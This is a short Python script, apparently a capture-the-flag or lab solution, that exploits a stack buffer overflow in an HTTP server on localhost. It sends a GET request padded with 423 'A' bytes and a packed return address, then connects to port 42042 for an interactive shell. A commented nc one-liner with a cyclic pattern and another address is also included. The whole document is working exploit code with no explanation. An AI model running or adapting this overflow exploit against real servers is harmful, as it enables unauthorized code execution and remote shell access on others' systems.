from pwn import *

payload = "GET /" + 423 * "A"
payload += p32(0x80489cc)
payload += " HTTP/1.1"

io = remote('127.0.0.1', 4242)

io.sendline(payload)

sleep(1) # the server is not immediatly created

io = remote('127.0.0.1', 42042)
io.interactive()


# python -c 'import struct; print "GET /AAAaAA0AABAAbAA1AACAAcAA2AADAAdAA3AAEAAeAA4AAFAAfAA5AAGAAgAA6AAHAAhAA7AAIAAiAA8AAJAAjAA9AAKAAkAALAAlAAMAAmAANAAnAAOAAoAAPAApAAQAAqAARAArAASAAsAATAAtAAUAAuAAVAAvAAWAAwAAXAAxAAYAAyAAZAAzAaaAa0AaBAabAa1AaCAacAa2AaDAadAa3AaEAaeAa4AaFAafAa5AaGAagAa6AaHAahAa7AaIAaiAa8AaJAajAa9AaKAakAaLAalAaMAamAaNAanAaOAaoAaPAapAaQAaqAaRAarAaSAasAaTAatAaUAauAaVAavAaWAawAaXAaxAaYAayAaZAazA0aA00A0BA0bA01A0CA0cA02A0DA0dA03A0EA0eA04A0FA0fA05A0GA0"+struct.pack("<I",0x8048ab4)+" HTTP/1.1"' | nc 127.0.0.1 4242
